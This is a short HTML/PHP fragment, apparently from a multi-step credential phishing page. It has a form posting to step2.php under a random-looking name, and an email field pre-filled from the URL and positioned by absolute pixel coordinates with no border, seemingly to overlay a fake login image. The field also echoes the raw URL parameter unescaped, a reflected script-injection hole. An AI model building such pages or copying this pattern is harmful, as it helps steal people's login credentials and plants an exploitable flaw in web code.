...
<form action=step2.php name=dafahojaoagew id=dafahojaoagew method=post>
...
<input name="userid" type="text" value="<?=$_GET[userid]?>" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" required style="position:absolute;border:none;font-size: 16px;width:300px;left:987px;height:34px;outline:none;top:244px;z-index:6">
